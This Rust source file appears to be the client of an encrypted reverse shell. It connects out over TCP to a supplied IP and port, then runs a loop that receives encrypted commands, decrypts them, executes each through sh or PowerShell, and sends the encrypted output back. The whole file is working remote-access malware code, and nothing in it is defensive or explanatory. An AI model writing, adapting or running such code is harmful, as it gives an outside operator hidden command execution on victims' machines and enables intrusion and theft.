use std::io::prelude::*;
use std::net::{TcpStream, Shutdown};
use std::io::BufReader;
use std::process::exit;

use std::process::Command;

use super::{utils, crypt};

pub struct Sock {
    pub stream: TcpStream,
    pub key: String
}

impl Sock {

    pub fn listen(&mut self) -> String {
        let mut reader = BufReader::new(self.stream.try_clone().unwrap());
        let mut buf = "".to_owned();

        // Flush the buffer
        let flush = self.stream.flush();

        // Handle error for flush
        match flush {
            Ok(()) => (),
            Err(err) => println!("[-] Error while flushing buffer: {}", err)
        };

        // Read line
       let result = reader.read_line(&mut buf);

       // Handle reading error
       match result {
           Ok(_) => (),
           Err(err) => println!("[-] Error while reading line: {}", err)
       }

        // Remove newline
        buf = buf.replace("\n", "");

        // Return result
        return buf;
    }
    
    pub fn send(&mut self, msg: &String, nonce: &String) {
        // Encrypt our message
        let msg = &crypt::encrypt(msg, &self.key, &nonce);

        // Get the result from sending the message
        let result = self.stream.write(format!("{msg}|{nonce}").as_bytes());

        // Handle errors
        match result {
            Ok(_) => (),
            Err(err) => println!("[-] Error while sending message: {}", err)
        }
    }

    pub fn close(&mut self) {
        // Shutdown the stream
        let result = self.stream.shutdown(Shutdown::Both);

        // Handle errors
        match result {
            Ok(_) => (),
            Err(err) => println!("[-] Error while ending stream: {}", err)
        }
    }

    pub fn manage(&mut self) {

        // Send our key
        let result = self.stream.write(&self.key.as_bytes());

        // Handle errors
        match result {
            Ok(_) => println!("[+] Key sent!"),
            Err(err) => println!("[-] Error while sending key: {}", err)
        }

        // Manage the commands
        loop {
            let msg: String = self.listen();

            // Check if msg is empty meaning socket is closed
            if msg == "" {
                println!("[i] Connection closed by host");
                exit(0);
            }

            let values: Vec<&str> = msg.split("|").collect();

            
            let encrypted = values[0].to_owned();
            let sent_nonce = values[1].to_owned();
            
            let decrypted =  crypt::decrypt(&encrypted, &self.key, &sent_nonce);
            
            self.manage_command(&decrypted);
        }
    }

    fn manage_command(&mut self, cmd: &str) {
        let command = &cmd.replace("\x08", "");

        let mut shell = "sh";
        if cfg!(windows) {
            shell = "powershell";
        }

        let output = Command::new(shell).args(&["-c", command]).output().unwrap();

        let mut out: String = std::str::from_utf8(output.stdout.as_slice()).unwrap().to_owned();

        if out == "" {
            out = std::str::from_utf8(output.stderr.as_slice()).unwrap().to_owned();
        }

        out = out.replace("\n", "2937846nd726345dnh");

        self.send(&out, &utils::random_nonce())
    }
}

pub fn connect(ip: &String, port: &String) -> TcpStream {
    let result = TcpStream::connect(format!("{ip}:{port}"));

    // Handle errors
    match result {
        Ok(conn) => {
            println!("[+] Connection successful!");
            conn
        },
        Err(_) => {
            println!("[-] Could not connect to host: {}:{}", ip, port);
            exit(0);
        }
    }
}